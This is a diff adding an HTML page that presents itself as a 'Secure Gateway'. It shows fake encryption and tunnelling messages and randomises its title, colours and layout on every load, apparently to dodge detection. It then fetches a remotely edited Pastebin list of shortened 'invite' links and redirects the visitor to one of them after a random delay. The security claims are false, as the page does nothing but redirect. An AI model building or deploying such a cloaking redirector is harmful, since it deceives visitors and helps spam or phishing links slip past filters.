@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Secure Gateway</title>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      overflow: hidden;
+      font-family: monospace;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    #console {
+      font-size: 20px;
+      position: absolute;
+    }
+  </style>
+</head>
+<body>
+  <div id="console">Loading secure session...</div>
+
+  <script>
+    const titles = [
+      "Secure Route", "Data Gate", "Stealth Mode",
+      "Ghost Layer", "Secure Link", "Encrypted Path",
+      "Anonymous Hop", "Digital Cloak", "Safe Exit"
+    ];
+
+    const messages = [
+      "Redirecting...", "Launching encrypted node...",
+      "Establishing secure tunnel...", "Initializing gateway...",
+      "Routing through CDN...", "Securing payload...",
+      "Activating proxy layer...", "Verifying signature...",
+      "Transmitting...", "Opening encrypted session...",
+      "Passing zero-trace mode...", "Dispatching endpoint...",
+      "Linking to safe host...", "Anonymizing route...",
+      "Bypassing filters...", "Loading proxy stream...",
+      "Redirect sequence engaged...", "Link secured. Executing...",
+      "Decrypting and moving...", "Establishing ghost route..."
+    ];
+
+    function randomFrom(arr) {
+      return arr[Math.floor(Math.random() * arr.length)];
+    }
+
+    function randomColor() {
+      const letters = "0123456789ABCDEF";
+      let color = "#";
+      for (let i = 0; i < 6; i++) {
+        color += letters[Math.floor(Math.random() * 16)];
+      }
+      return color;
+    }
+
+    function randomPosition() {
+      return {
+        top: Math.floor(Math.random() * 80) + "%",
+        left: Math.floor(Math.random() * 80) + "%"
+      };
+    }
+
+    // تعديل العنوان والمظهر
+    document.title = randomFrom(titles);
+    const consoleDiv = document.getElementById("console");
+    consoleDiv.textContent = randomFrom(messages);
+    document.body.style.backgroundColor = randomColor();
+    consoleDiv.style.color = randomColor();
+    const pos = randomPosition();
+    consoleDiv.style.top = pos.top;
+    consoleDiv.style.left = pos.left;
+
+    // رابط Pastebin الذي يحتوي على روابط الدعوة المختصرة
+    const pastebinUrl = "https://pastebin.com/raw/YA4fAtA3";
+
+    // تحميل روابط الاختصار من Pastebin
+    fetch(pastebinUrl)
+      .then(res => res.text())
+      .then(text => {
+        const links = text.split("\n").map(x => x.trim()).filter(x => x);
+        const randomLink = randomFrom(links);
+        setTimeout(() => {
+          window.location.href = randomLink;
+        }, Math.random() * (7000 - 3000) + 3000); // من 3 إلى 7 ثواني
+      })
+      .catch(err => {
+        console.error("Error loading links:", err);
+        consoleDiv.textContent = "Failed to load secure links.";
+      });
+  </script>
+</body>
+</html>
